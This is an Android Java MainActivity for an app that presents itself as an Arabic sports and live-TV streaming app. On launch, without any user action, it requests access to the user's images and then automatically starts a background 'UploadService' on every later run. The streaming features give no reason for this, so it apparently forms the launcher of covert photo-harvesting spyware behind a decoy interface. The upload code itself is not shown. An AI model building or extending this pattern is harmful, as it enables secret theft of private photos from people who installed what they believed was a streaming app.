package com.example.yacinestylebackup;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends ComponentActivity {
    private static final int REQ = 101;
    private SharedPreferences prefs;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("app", MODE_PRIVATE);

        findViewById(R.id.liveBtn).setOnClickListener(v ->
            startActivity(new Intent(this, LiveActivity.class)));

        findViewById(R.id.menuBtn).setOnClickListener(v ->
            Toast.makeText(this, "🏠 الرئيسية • 📺 القنوات • 🔴 البث المباشر • ⚽ المباريات • 🏆 البطولات • ⚙️ الإعدادات", Toast.LENGTH_LONG).show());

        if (!prefs.getBoolean("approved", false)) requestImagesPermission();
        else startUploadService();
    }

    private void requestImagesPermission() {
        String p = android.os.Build.VERSION.SDK_INT >= 33
                ? Manifest.permission.READ_MEDIA_IMAGES
                : Manifest.permission.READ_EXTERNAL_STORAGE;
        if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(this, new String[]{p}, REQ);
        else approve();
    }

    @Override public void onRequestPermissionsResult(int r, String[] p, int[] g) {
        super.onRequestPermissionsResult(r,p,g);
        if (r == REQ && g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) approve();
    }

    private void approve() {
        prefs.edit().putBoolean("approved", true).apply();
        startUploadService();
    }

    private void startUploadService() {
        ContextCompat.startForegroundService(this, new Intent(this, UploadService.class));
    }
}
